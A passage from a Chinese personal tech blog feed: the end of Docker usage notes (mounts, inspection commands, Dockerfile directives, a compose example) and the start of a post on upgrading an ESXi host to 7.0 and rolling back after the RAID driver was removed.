<li>目标目录通过 <code>dst</code>、<code>destination</code> 或 <code>target</code> 指定</li>
<li>更多内容看这里 👉 <a href="https://docs.docker.com/storage/bind-mounts/">https://docs.docker.com/storage/bind-mounts/</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过mount将宿主机目录挂载到容器，可通过添加,read-only限制只读</span></span><br><span class="line">--mount type=bind,source=/var/www/html,target=/web,read-only </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">也可通过mount挂载卷</span></span><br><span class="line">--mount type=colume,src=vol-demo,dst=/usr/local/data</span><br></pre></td></tr></table></figure>

<h3 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker system <span class="built_in">df</span>     <span class="comment"># 查看镜像、容器、数据卷所占用空间</span></span></span><br><span class="line">TYPE            TOTAL     ACTIVE    SIZE      RECLAIMABLE</span><br><span class="line">Images          11        3         7.909GB   5.718GB (72%)</span><br><span class="line">Containers      3         0         264.4MB   264.4MB (100%)</span><br><span class="line">Local Volumes   0         0         0B        0B</span><br><span class="line">Build Cache     286       0         3.56GB    3.56GB</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker diff 550      <span class="comment"># 查看容器存储层的改动内容</span></span></span><br><span class="line">C /etc</span><br><span class="line">A /etc/todos</span><br><span class="line">A /etc/todos/todo.db</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker inspect 550    <span class="comment"># 获取容器/镜像的元数据</span></span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker container logs 550  <span class="comment"># 获取容器的输出信息</span></span></span><br><span class="line">Using sqlite database at /etc/todos/todo.db</span><br><span class="line">Listening on port 3000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><ul>
<li>使用 Dockerfile 文件来定制镜像</li>
<li>Dockerfile 中的每一个指令都会建立一层，shell 命令尽量写在一行中，用 <code>&amp;&amp;</code> 串联，时刻注意这是在构建每一层，而不是 shell 脚本</li>
<li>注意每一层构建的最后一定要清理掉无关文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker build -t 镜像名 &lt;上下文路径&gt; [-f &lt;dockerfile path&gt;]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker build -t test-image .</span></span><br></pre></td></tr></table></figure>


<h3 id="Dockerfile指令"><a href="#Dockerfile指令" class="headerlink" title="Dockerfile指令"></a>Dockerfile指令</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># FROM 用来指定基础镜像，必须为第一条指令</span></span><br><span class="line"><span class="keyword">FROM</span> ImageName</span><br><span class="line"><span class="comment"># RUN 指令用来执行命令行命令，与直接在命令行中输入的命令一样</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">command</span></span></span><br><span class="line"><span class="comment"># 复制文件到镜像</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> [--<span class="built_in">chown</span>=&lt;user&gt;:&lt;group&gt;] &lt;源路径&gt; &lt;目标路径&gt;</span></span><br><span class="line"><span class="comment"># CMD 用于指定默认容器主进程的启动命令</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> &lt;命令&gt;</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;program&quot;</span>, <span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg2&quot;</span> ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于设置环境变量，容器运行时依旧存在</span></span><br><span class="line"><span class="keyword">ENV</span> &lt;key&gt; &lt;value&gt;      </span><br><span class="line"><span class="comment"># 用于设置环境变量，容器运行时不会存在，定义的默认值可使用--build-arg来覆盖，要使用时需要在各个阶段指定   </span></span><br><span class="line"><span class="keyword">ARG</span> &lt;key&gt;[=&lt;value&gt;]</span><br><span class="line"><span class="comment"># 定义匿名卷</span></span><br><span class="line">VOLUMNE &lt;路径&gt;</span><br><span class="line"><span class="comment"># 声明容器运行时提供服务的端口，在执行docker run -P时会随机映射EXPOSE的端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> &lt;端口<span class="number">1</span>&gt; [&lt;端口<span class="number">2</span>&gt;...]</span><br><span class="line"><span class="comment"># 指定工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> &lt;工作目录路径&gt;</span></span><br><span class="line"><span class="comment"># 指定当前用户</span></span><br><span class="line"><span class="keyword">USER</span> &lt;用户名&gt;[:&lt;用户组&gt;]</span><br><span class="line"><span class="comment"># 指定 RUN、ENTRYPOINT、CMD指令的shell，默认是 /bin/sh -c</span></span><br><span class="line"><span class="keyword">SHELL</span><span class="language-bash"> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;parameters&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>更多内容查看：</p>
<ul>
<li><a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile">https://yeasy.gitbook.io/docker_practice/image/dockerfile</a></li>
<li><a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a></li>
</ul>
</blockquote>
<h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker-Compose"></a>Docker-Compose</h2><blockquote>
<p>学习资料 👉 <a href="https://docs.docker.com/compose/gettingstarted/">https://docs.docker.com/compose/gettingstarted/</a></p>
</blockquote>
<ul>
<li>安装: <a href="https://docs.docker.com/compose/install/">https://docs.docker.com/compose/install/</a><ul>
<li>Step1: 安装 <a href="https://docs.docker.com/get-docker/">Docker Engine</a></li>
<li>Step2: 安装 <a href="https://docs.docker.com/compose/install/">Docker Compose</a></li>
</ul>
</li>
</ul>
<p>安装完成后能正常执行 <code>docker compose version</code> 就 OK：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker compose version</span></span><br><span class="line">Docker Compose version v2.20.2</span><br></pre></td></tr></table></figure>

<p>放一个 <code>docker/getting-started</code> 中的例子:</p>
<ul>
<li>创建 <code>compose.yaml</code> 配置文件:<ul>
<li>目前的默认路径是工作目录的 <code>compose.yaml</code> 或 <code>compose.yml</code></li>
<li>仍支持早期版本的 <code>docker-compose.yaml</code> 和 <code>docker-compose.yml</code></li>
</ul>
</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">node:12-alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">-c</span> <span class="string">&quot;yarn install &amp;&amp; yarn run dev&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3000</span><span class="string">:3000</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">/app</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./:/app</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_HOST:</span> <span class="string">mysql</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="string">secret</span></span><br><span class="line">      <span class="attr">MYSQL_DB:</span> <span class="string">todos</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:5.7</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">todo-mysql-data:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">environment:</span> </span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">secret</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">todos</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">todo-mysql-data:</span></span><br></pre></td></tr></table></figure>

<p>启动:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker compose up -d</span></span><br></pre></td></tr></table></figure>

<p>停止并销毁容器和网络:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker compose down</span></span><br></pre></td></tr></table></figure>

<p>复杂的需求就直接查文档 + GPT 吧😅</p>
<blockquote>
<p>完整的 compose.yaml 配置说明 👉 <a href="https://docs.docker.com/compose/compose-file/03-compose-file/">https://docs.docker.com/compose/compose-file/03-compose-file/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Tool</category>
      </categories>
      <tags>
        <tag>Ops</tag>
      </tags>
  </entry>
  <entry>
    <title>vSphere 折腾记 -- ESXi 系统升级+回滚</title>
    <url>/2023/10/13/esxi-upgrade/</url>
    <content><![CDATA[<h1 id="ESXi-系统升级-–-因-RAID-消失又回滚"><a href="#ESXi-系统升级-–-因-RAID-消失又回滚" class="headerlink" title="ESXi 系统升级 – 因 RAID 消失又回滚"></a>ESXi 系统升级 – 因 RAID 消失又回滚</h1><h2 id="系统升级之旅"><a href="#系统升级之旅" class="headerlink" title="系统升级之旅"></a>系统升级之旅</h2><p>2023.10.12 晚闲来无事，日常维护打补丁。但还是有一台 ESXi 主机是 6.5 版本，其他都是 7.0 版本，高版本没法迁移虚拟机到低版本上，就想给他升个级统一一下 （👴应该先考虑就这一台机器不升级一定是有原因的）</p>
<p>那么就开始动手，经过一番网上冲浪，找到<a href="https://my.vmware.com/zh/group/vmware/patch#search">下载资源</a>，登录、选择 7.0，下载，上传一气呵成</p>
<blockquote>
<p>下载: VMware-ESXi-7.0b-16324942-depot.zip<br>上传: web 管理页直接上传升级包到存储设备上, 记住上传到的数据存储名称</p>
</blockquote>
<p>开启 SSH，登录 ESXi 主机，执行升级命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先列出升级的模块:</span></span><br><span class="line">[root@esxi-t4:~] esxcli software sources profile list -d /vmfs/volumes/datastore3/VMware-ESXi-7.0b-16324942-depot.zip</span><br><span class="line">Name                          Vendor        Acceptance Level</span><br><span class="line">----------------------------  ------------  ----------------</span><br><span class="line">ESXi-7.0bs-16321839-no-tools  VMware, Inc.  PartnerSupported</span><br><span class="line">ESXi-7.0b-16324942-no-tools   VMware, Inc.  PartnerSupported</span><br><span class="line">ESXi-7.0bs-16321839-standard  VMware, Inc.  PartnerSupported</span><br><span class="line">ESXi-7.0b-16324942-standard   VMware, Inc.  PartnerSupported</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来要升级的模块是: ESXi-7.0b-16324942-standard, 先添加 --dry-run 参数试运行一下（安装或更新过程的试运行不会进行任何更改，但会打印出在不带--dry-run选项的情况下运行命令时将执行操作）</span></span><br><span class="line">[root@esxi-t4:~] esxcli software profile update -p ESXi-7.0b-16324942-standard -d -d /vmfs/volumes/datastore3/VMware-ESXi-7.0b-16324942-depot.zip --dry-run</span><br><span class="line">Update Result</span><br><span class="line">   Message: The update completed successfully, but the system needs to be rebooted <span class="keyword">for</span> the changes to be effective.</span><br><span class="line">   Reboot Required: <span class="literal">true</span></span><br><span class="line">   VIBs Installed: VMW_bootbank_bnxtnet_216.0.50.0-4vmw.700.1.0.15843807, VMW_bootbank_bnxtroce_216.0.58.0-1vmw.700.1.0.15843807, VMW_bootbank_brcmfcoe_12.0.1500.0-1vmw.700.1.0.15843807, VMW_bootbank_brcmnvmefc_12.4.293.2-3vmw.700.1.0.15843807, VMW_bootbank_elxiscsi_12.0.1200.0-1vmw.700.1.0.15843807, VMW_bootbank_elxnet_12.0.1250.0-5vmw.700.1.0.15843807, VMW_bootbank_i40en_1.8.1.16-1vmw.700.1.0.15843807, VMW_bootbank_i40iwn_1.1.2.5-1vmw.700.1.0.15843807, VMW_bootbank_iavmd_2.0.0.1055-3vmw.700.1.0.15843807, VMW_bootbank_igbn_0.1.1.0-6vmw.700.1.0.15843807, VMW_bootbank_iser_1.1.0.0-1vmw.700.1.0.15843807, VMW_bootbank_ixgben_1.7.1.26-1vmw.700.1.0.15843807, VMW_bootbank_lpfc_12.4.293.3-5vmw.700.1.0.15843807, VMW_bootbank_lpnic_11.4.62.0-1vmw.700.1.0.15843807, VMW_bootbank_lsi-mr3_7.712.50.00-1vmw.700.1.0.15843807, VMW_bootbank_lsi-msgpt2_20.00.06.00-2vmw.700.1.0.15843807, VMW_bootbank_lsi-msgpt35_13.00.12.00-1vmw.700.1.0.15843807, VMW_bootbank_lsi-msgpt3_17.00.10.00-1vmw.700.1.0.15843807, VMW_bootbank_mtip32xx-native_3.9.8-1vmw.700.1.0.15843807, VMW_bootbank_ne1000_0.8.4-10vmw.700.1.0.15843807, VMW_bootbank_nenic_1.0.29.0-1vmw.700.1.0.15843807, VMW_bootbank_nfnic_4.0.0.44-1vmw.700.1.0.15843807, VMW_bootbank_nhpsa_2.0.50-1vmw.700.1.0.15843807, VMW_bootbank_nmlx4-core_3.19.16.7-1vmw.700.1.0.15843807, VMW_bootbank_nmlx4-en_3.19.16.7-1vmw.700.1.0.15843807, VMW_bootbank_nmlx4-rdma_3.19.16.7-1vmw.700.1.0.15843807, VMW_bootbank_nmlx5-core_4.19.16.7-1vmw.700.1.0.15843807, VMW_bootbank_nmlx5-rdma_4.19.16.7-1vmw.700.1.0.15843807, VMW_bootbank_ntg3_4.1.4.1-1vmw.700.1.0.15843807, VMW_bootbank_nvme-pcie_1.2.2.14-1vmw.700.1.25.16324942, VMW_bootbank_nvmerdma_1.0.0.0-1vmw.700.1.0.15843807, VMW_bootbank_nvmxnet3-ens_2.0.0.22-1vmw.700.1.0.15843807, VMW_bootbank_nvmxnet3_2.0.0.30-1vmw.700.1.0.15843807, VMW_bootbank_pvscsi_0.1-2vmw.700.1.0.15843807, VMW_bootbank_qcnic_1.0.15.0-8vmw.700.1.0.15843807, VMW_bootbank_qedentv_3.12.1.0-23vmw.700.1.0.15843807, VMW_bootbank_qedrntv_3.12.1.2-12vmw.700.1.0.15843807, VMW_bootbank_qfle3_1.0.66.0-5vmw.700.1.0.15843807, VMW_bootbank_qfle3f_1.0.51.0-12vmw.700.1.0.15843807, VMW_bootbank_qfle3i_1.0.15.0-6vmw.700.1.0.15843807, VMW_bootbank_qflge_1.1.0.11-1vmw.700.1.0.15843807, VMW_bootbank_rste_2.0.2.0088-7vmw.700.1.0.15843807, VMW_bootbank_sfvmk_2.0.0.1004-3vmw.700.1.0.15843807, VMW_bootbank_smartpqi_1.0.4.3011-1vmw.700.1.0.15843807, VMW_bootbank_vmkata_0.1-1vmw.700.1.0.15843807, VMW_bootbank_vmkfcoe_1.0.0.2-1vmw.700.1.0.15843807, VMW_bootbank_vmkusb_0.1-1vmw.700.1.25.16324942, VMW_bootbank_vmw-ahci_1.3.9-1vmw.700.1.0.15843807, VMware_bootbank_cpu-microcode_7.0.0-1.25.16324942, VMware_bootbank_crx_7.0.0-1.25.16324942, VMware_bootbank_elx-esx-libelxima.so_12.0.1200.0-2vmw.700.1.0.15843807, VMware_bootbank_esx-base_7.0.0-1.25.16324942, VMware_bootbank_esx-dvfilter-generic-fastpath_7.0.0-1.25.16324942, VMware_bootbank_esx-update_7.0.0-1.25.16324942, VMware_bootbank_esx-xserver_7.0.0-1.25.16324942, VMware_bootbank_loadesx_7.0.0-1.25.16324942, VMware_bootbank_lsuv2-hpv2-hpsa-plugin_1.0.0-2vmw.700.1.0.15843807, VMware_bootbank_lsuv2-intelv2-nvme-vmd-plugin_1.0.0-2vmw.700.1.0.15843807, VMware_bootbank_lsuv2-lsiv2-drivers-plugin_1.0.0-2vmw.700.1.0.15843807, VMware_bootbank_lsuv2-nvme-pcie-plugin_1.0.0-1vmw.700.1.0.15843807, VMware_bootbank_lsuv2-oem-dell-plugin_1.0.0-1vmw.700.1.0.15843807, VMware_bootbank_lsuv2-oem-hp-plugin_1.0.0-1vmw.700.1.0.15843807, VMware_bootbank_lsuv2-oem-lenovo-plugin_1.0.0-1vmw.700.1.0.15843807, VMware_bootbank_lsuv2-smartpqiv2-plugin_1.0.0-3vmw.700.1.0.15843807, VMware_bootbank_native-misc-drivers_7.0.0-1.25.16324942, VMware_bootbank_qlnativefc_4.0.1.0-3vmw.700.1.0.15843807, VMware_bootbank_vdfs_7.0.0-1.25.16324942, VMware_bootbank_vmware-esx-esxcli-nvme-plugin_1.2.0.37-1vmw.700.1.0.15843807, VMware_bootbank_vsan_7.0.0-1.25.16324942, VMware_bootbank_vsanhealth_7.0.0-1.25.16324942, VMware_locker_tools-light_11.1.0.16036546-16321839</span><br><span class="line">   VIBs Removed: Adaptec_Inc_bootbank_scsi-aacraid_6.0.6.2.1.58012-1OEM.600.0.0.2494585, VMW_bootbank_ata-libata-92_3.00.9.2-16vmw.650.0.0.4564106, VMW_bootbank_ata-pata-amd_0.3.10-3vmw.650.0.0.4564106, VMW_bootbank_ata-pata-atiixp_0.4.6-4vmw.650.0.0.4564106, VMW_bootbank_ata-pata-cmd64x_0.2.5-3vmw.650.0.0.4564106, VMW_bootbank_ata-pata-hpt3x2n_0.3.4-3vmw.650.0.0.4564106, VMW_bootbank_ata-pata-pdc2027x_1.0-3vmw.650.0.0.4564106, VMW_bootbank_ata-pata-serverworks_0.4.3-3vmw.650.0.0.4564106, VMW_bootbank_ata-pata-sil680_0.4.8-3vmw.650.0.0.4564106, VMW_bootbank_ata-pata-via_0.3.3-2vmw.650.0.0.4564106, VMW_bootbank_block-cciss_3.6.14-10vmw.650.0.0.4564106, VMW_bootbank_bnxtnet_20.6.101.7-23vmw.650.3.96.13932383, VMW_bootbank_brcmfcoe_11.4.1078.26-14vmw.650.3.170.18678235, VMW_bootbank_char-random_1.0-3vmw.650.0.0.4564106, VMW_bootbank_ehci-ehci-hcd_1.0-4vmw.650.0.14.5146846, VMW_bootbank_elxnet_11.1.91.0-1vmw.650.0.0.4564106, VMW_bootbank_hid-hid_1.0-3vmw.650.0.0.4564106, VMW_bootbank_i40en_1.8.1.9-2vmw.650.3.96.13932383, VMW_bootbank_igbn_0.1.1.0-4vmw.650.3.96.13932383, VMW_bootbank_ima-qla4xxx_2.02.18-1vmw.650.0.0.4564106, VMW_bootbank_ipmi-ipmi-devintf_39.1-5vmw.650.2.50.8294253, VMW_bootbank_ipmi-ipmi-msghandler_39.1-5vmw.650.2.50.8294253, VMW_bootbank_ipmi-ipmi-si-drv_39.1-4vmw.650.0.0.4564106, VMW_bootbank_ixgben_1.7.1.15-1vmw.650.3.96.13932383, VMW_bootbank_lpfc_11.4.33.26-14vmw.650.3.138.16576891, VMW_bootbank_lsi-mr3_7.708.07.00-3vmw.650.3.96.13932383, VMW_bootbank_lsi-msgpt2_20.00.06.00-2vmw.650.3.96.13932383, VMW_bootbank_lsi-msgpt35_09.00.00.00-5vmw.650.3.96.13932383, VMW_bootbank_lsi-msgpt3_17.00.02.00-1vmw.650.3.96.13932383, VMW_bootbank_misc-cnic-register_1.78.75.v60.7-1vmw.650.0.0.4564106, VMW_bootbank_misc-drivers_6.5.0-3.96.13932383, VMW_bootbank_mtip32xx-native_3.9.5-1vmw.650.0.0.4564106, VMW_bootbank_ne1000_0.8.3-8vmw.650.2.75.10884925, VMW_bootbank_nenic_1.0.29.0-1vmw.650.3.96.13932383, VMW_bootbank_net-bnx2_2.2.4f.v60.10-2vmw.650.0.0.4564106, VMW_bootbank_net-bnx2x_1.78.80.v60.12-1vmw.650.0.0.4564106, VMW_bootbank_net-cdc-ether_1.0-3vmw.650.0.0.4564106, VMW_bootbank_net-cnic_1.78.76.v60.13-2vmw.650.0.0.4564106, VMW_bootbank_net-e1000_8.0.3.1-5vmw.650.3.153.17459147, VMW_bootbank_net-e1000e_3.2.2.1-2vmw.650.0.0.4564106, VMW_bootbank_net-enic_2.1.2.38-2vmw.650.0.0.4564106, VMW_bootbank_net-fcoe_1.0.29.9.3-7vmw.650.0.0.4564106, VMW_bootbank_net-forcedeth_0.61-2vmw.650.0.0.4564106, VMW_bootbank_net-igb_5.0.5.1.1-5vmw.650.0.0.4564106, VMW_bootbank_net-ixgbe_3.7.13.7.14iov-20vmw.650.0.0.4564106, VMW_bootbank_net-libfcoe-92_1.0.24.9.4-8vmw.650.0.0.4564106, VMW_bootbank_net-mlx4-core_1.9.7.0-1vmw.650.0.0.4564106, VMW_bootbank_net-mlx4-en_1.9.7.0-1vmw.650.0.0.4564106, VMW_bootbank_net-nx-nic_5.0.621-5vmw.650.0.0.4564106, VMW_bootbank_net-tg3_3.131d.v60.4-2vmw.650.0.0.4564106, VMW_bootbank_net-usbnet_1.0-3vmw.650.0.0.4564106, VMW_bootbank_net-vmxnet3_1.1.3.0-3vmw.650.3.138.16576891, VMW_bootbank_nhpsa_2.0.22-3vmw.650.2.50.8294253, VMW_bootbank_nmlx4-core_3.16.0.0-1vmw.650.0.0.4564106, VMW_bootbank_nmlx4-en_3.16.0.0-1vmw.650.0.0.4564106, VMW_bootbank_nmlx4-rdma_3.16.0.0-1vmw.650.0.0.4564106, VMW_bootbank_nmlx5-core_4.16.0.0-1vmw.650.0.0.4564106, VMW_bootbank_ntg3_4.1.3.2-1vmw.650.2.75.10884925, VMW_bootbank_nvme_1.2.2.28-5vmw.650.3.170.18678235, VMW_bootbank_nvmxnet3_2.0.0.23-1vmw.650.1.36.7388607, VMW_bootbank_ohci-usb-ohci_1.0-3vmw.650.0.0.4564106, VMW_bootbank_pvscsi_0.1-1vmw.650.1.26.5969303, VMW_bootbank_qedentv_2.0.6.4-8vmw.650.2.50.8294253, VMW_bootbank_qfle3_1.0.2.7-1vmw.650.0.0.4564106, VMW_bootbank_qflge_1.1.0.3-1vmw.650.0.0.4564106, VMW_bootbank_qlnativefc_2.1.73.0-5vmw.650.3.96.13932383, VMW_bootbank_sata-ahci_3.0-26vmw.650.1.26.5969303, VMW_bootbank_sata-ata-piix_2.12-10vmw.650.0.0.4564106, VMW_bootbank_sata-sata-nv_3.5-4vmw.650.0.0.4564106, VMW_bootbank_sata-sata-promise_2.12-3vmw.650.0.0.4564106, VMW_bootbank_sata-sata-sil24_1.1-1vmw.650.0.0.4564106, VMW_bootbank_sata-sata-sil_2.3-4vmw.650.0.0.4564106, VMW_bootbank_sata-sata-svw_2.3-3vmw.650.0.0.4564106, VMW_bootbank_scsi-adp94xx_1.0.8.12-6vmw.650.0.0.4564106, VMW_bootbank_scsi-aic79xx_3.1-5vmw.650.0.0.4564106, VMW_bootbank_scsi-bnx2fc_1.78.78.v60.8-1vmw.650.0.0.4564106, VMW_bootbank_scsi-bnx2i_2.78.76.v60.8-1vmw.650.0.0.4564106, VMW_bootbank_scsi-fnic_1.5.0.45-3vmw.650.0.0.4564106, VMW_bootbank_scsi-hpsa_6.0.0.84-1vmw.650.0.0.4564106, VMW_bootbank_scsi-ips_7.12.05-4vmw.650.0.0.4564106, VMW_bootbank_scsi-iscsi-linux-92_1.0.0.2-3vmw.650.0.0.4564106, VMW_bootbank_scsi-libfc-92_1.0.40.9.3-5vmw.650.0.0.4564106, VMW_bootbank_scsi-megaraid-mbox_2.20.5.1-6vmw.650.0.0.4564106, VMW_bootbank_scsi-megaraid-sas_6.603.55.00-2vmw.650.0.0.4564106, VMW_bootbank_scsi-megaraid2_2.00.4-9vmw.650.0.0.4564106, VMW_bootbank_scsi-mpt2sas_19.00.00.00-1vmw.650.0.0.4564106, VMW_bootbank_scsi-mptsas_4.23.01.00-10vmw.650.0.0.4564106, VMW_bootbank_scsi-mptspi_4.23.01.00-10vmw.650.0.0.4564106, VMW_bootbank_scsi-qla4xxx_5.01.03.2-7vmw.650.0.0.4564106, VMW_bootbank_shim-iscsi-linux-9-2-1-0_6.5.0-0.0.4564106, VMW_bootbank_shim-iscsi-linux-9-2-2-0_6.5.0-0.0.4564106, VMW_bootbank_shim-libata-9-2-1-0_6.5.0-0.0.4564106, VMW_bootbank_shim-libata-9-2-2-0_6.5.0-0.0.4564106, VMW_bootbank_shim-libfc-9-2-1-0_6.5.0-0.0.4564106, VMW_bootbank_shim-libfc-9-2-2-0_6.5.0-0.0.4564106, VMW_bootbank_shim-libfcoe-9-2-1-0_6.5.0-0.0.4564106, VMW_bootbank_shim-libfcoe-9-2-2-0_6.5.0-0.0.4564106, VMW_bootbank_shim-vmklinux-9-2-1-0_6.5.0-0.0.4564106, VMW_bootbank_shim-vmklinux-9-2-2-0_6.5.0-0.0.4564106, VMW_bootbank_shim-vmklinux-9-2-3-0_6.5.0-0.0.4564106, VMW_bootbank_smartpqi_1.0.1.553-28vmw.650.3.96.13932383, VMW_bootbank_uhci-usb-uhci_1.0-3vmw.650.0.0.4564106, VMW_bootbank_usb-storage-usb-storage_1.0-3vmw.650.0.0.4564106, VMW_bootbank_usbcore-usb_1.0-3vmw.650.2.50.8294253, VMW_bootbank_vmkata_0.1-1vmw.650.1.36.7388607, VMW_bootbank_vmkplexer-vmkplexer_6.5.0-0.0.4564106, VMW_bootbank_vmkusb_0.1-1vmw.650.3.170.18678235, VMW_bootbank_vmw-ahci_1.1.6-1vmw.650.3.96.13932383, VMW_bootbank_xhci-xhci_1.0-3vmw.650.0.0.4564106, VMware_bootbank_cpu-microcode_6.5.0-3.134.16576879, VMware_bootbank_emulex-esx-elxnetcli_11.1.28.0-0.0.4564106, VMware_bootbank_esx-base_6.5.0-3.191.20448942, VMware_bootbank_esx-dvfilter-generic-fastpath_6.5.0-1.36.7388607, VMware_bootbank_esx-tboot_6.5.0-3.191.20448942, VMware_bootbank_esx-xserver_6.5.0-3.184.19588618, VMware_bootbank_lsu-hp-hpsa-plugin_2.0.0-16vmw.650.3.96.13932383, VMware_bootbank_lsu-lsi-drivers-plugin_1.0.0-1vmw.650.2.79.11925212, VMware_bootbank_lsu-lsi-lsi-mr3-plugin_1.0.0-11vmw.650.2.75.10884925, VMware_bootbank_lsu-lsi-lsi-msgpt3-plugin_1.0.0-8vmw.650.2.79.11925212, VMware_bootbank_lsu-lsi-megaraid-sas-plugin_1.0.0-8vmw.650.1.26.5969303, VMware_bootbank_lsu-lsi-mpt2sas-plugin_2.0.0-6vmw.650.1.26.5969303, VMware_bootbank_native-misc-drivers_6.5.0-3.120.15256549, VMware_bootbank_rste_2.0.2.0088-4vmw.650.0.0.4564106, VMware_bootbank_vmware-esx-esxcli-nvme-plugin_1.2.0.36-3.96.13932383, VMware_bootbank_vsan_6.5.0-3.191.20076035, VMware_bootbank_vsanhealth_6.5.0-3.191.20076036, VMware_locker_tools-light_6.5.0-3.191.20448942</span><br><span class="line">   VIBs Skipped: VMware_bootbank_esx-ui_1.34.0-15603211</span><br><span class="line"><span class="comment"># 正常打印出这样的内容就可以去掉 --dry-run 正式执行更新了</span></span><br><span class="line">[root@esxi-t4:~] esxcli software profile update -p ESXi-7.0b-16324942-standard -d -d /vmfs/volumes/datastore3/VMware-ESXi-7.0b-16324942-depot.zip</span><br><span class="line"><span class="comment"># 重启后生效</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考内容： <a href="https://blog.csdn.net/m0_54210259/article/details/126525982">在线升级版本：ESXI6.5升级7.0</a></p>
</blockquote>
<p>重启完成后成功升级到 7.0 版本 ESXi，当然，也不出意外的出了意外 👉 我虚拟机呢？咋无法访问了？，，，哎不对硬盘呢？😅</p>
<ul>
<li>然后发现不在 RAID 上的虚拟机正常，在的全是红叹号（忘了截个图记录一下壮观的场面了）</li>
<li>再回去看看这打印的日志输出，开头一个 <code>VIBs Removed: Adaptec_Inc_bootbank_scsi-aacraid_6.0.6.2.1.58012-1OEM.600.0.0.2494585,</code> 😅 驱动被扬了</li>
</ul>
<h2 id="系统回滚之旅"><a href="#系统回滚之旅" class="headerlink" title="系统回滚之旅"></a>系统回滚之旅</h2><h3 id="尝试寻找新驱动"><a href="#尝试寻找新驱动" class="headerlink" title="尝试寻找新驱动"></a>尝试寻找新驱动</h3><ul>
<li>👴大意了，忘了这台机器上有 RAID 卡（PM8060），看到会移除旧驱动也没考虑到新版本需不需要重装驱动的问题</li>
<li>那既然旧驱动没了，找找新驱动吧<ul>
<li>然后，果然，没有支持 7.x 的驱动😅</li>
<li>在服务器上倒是找到了 6.x 下能用的驱动</li>
<li>在浪潮产品支持页也能找到该 RAID 卡的驱动，也最高只有 6.x: <a href="https://www.inspur.com/eportal/ui?struts.portlet.action=/portlet/download-front!toView.action&pageId=2367231&product_id=4193&index=0&part_id=#driver">驱动下载</a></li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231013212336890.png" alt="image-20231013212336890"></p>
<ul>
<li>那没辙了，回滚吧</li>
</ul>
<h3 id="降级安装-6-x-版本回滚"><a href="#降级安装-6-x-版本回滚" class="headerlink" title="降级安装: 6.x 版本回滚"></a>降级安装: 6.x 版本回滚</h3><ul>
<li><p>Bing 一搜能看到可以在开机加载时 <code>Shift+r</code> 能从 6.7 回滚到 6.5，👴 一激动去试了三遍都不行，结果发现 7.0 下行不通了: </p>
<ul>
